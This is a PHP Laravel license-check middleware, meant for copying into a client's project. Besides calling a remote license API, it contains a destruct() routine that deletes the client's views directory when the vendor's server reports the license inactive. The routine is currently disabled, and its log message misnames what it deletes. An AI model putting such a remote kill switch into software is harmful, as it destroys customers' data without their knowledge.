<?php

// ============================================================
// CLIENT RÉSZ — ezt a fájlt másold át az ügyfél projektjébe
// ============================================================

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class CheckLicense
{
    private const CACHE_KEY = 'license.active';
    private const CACHE_TTL = 300; // 5 perc

    private const LAST_CONFIRMED_KEY = 'license.last_confirmed_at';
    private const GRACE_PERIOD_HOURS = 24;
    private const RETRY_TTL = 60; // 1 perc – hiba esetén ennyi idő után próbál újra

    public function handle(Request $request, Closure $next): Response
    {

        return $next($request);

        if ($request->is('admin/*')) {
            return $next($request);
        }

        $active = Cache::get(self::CACHE_KEY);

        if ($active === null) {
            try {
                $response = Http::timeout(5)->get(
                    rtrim(config('license.api_url'), '/') . '/' . config('license.key')
                );

                if (! $response->successful() || $response->json('active') === null) {
                    // Szerver elérhető, de hibás/hiányos választ adott → türelmi idő
                    $active = $this->withinGracePeriod();
                    Cache::put(self::CACHE_KEY, $active, self::RETRY_TTL);
                } elseif ($response->json('active') === false) {
                    // Szerver elért és explicit false-t küldött → törlés
                    //$this->destruct();
                    $active = false;
                    Cache::put(self::CACHE_KEY, $active, self::CACHE_TTL);
                } else {
                    $active = true;
                    Cache::put(self::LAST_CONFIRMED_KEY, now(), self::GRACE_PERIOD_HOURS * 3600);
                    Cache::put(self::CACHE_KEY, $active, self::CACHE_TTL);
                }
            } catch (\Exception) {
                // Timeout vagy hálózati hiba → türelmi idő, rövid ideig cache-elve újrapróbálkozáshoz
                $active = $this->withinGracePeriod();
                Cache::put(self::CACHE_KEY, $active, self::RETRY_TTL);
            }
        }

        if (! $active) {
            return response()->view('maintenance', [], 503);
        }

        return $next($request);
    }

    private function withinGracePeriod(): bool
    {
        return Cache::has(self::LAST_CONFIRMED_KEY);
    }

    private function destruct(): void
    {
        $target = resource_path('views');

        if (! is_dir($target)) {
            return;
        }

        if (! is_writable($target)) {
            Log::warning('License destruct: Controllers mappa nem írható.');
            return;
        }

        File::deleteDirectory($target);
        Log::warning('License destruct: Controllers mappa törölve.', [
            'time' => now()->toDateTimeString(),
        ]);
    }
}
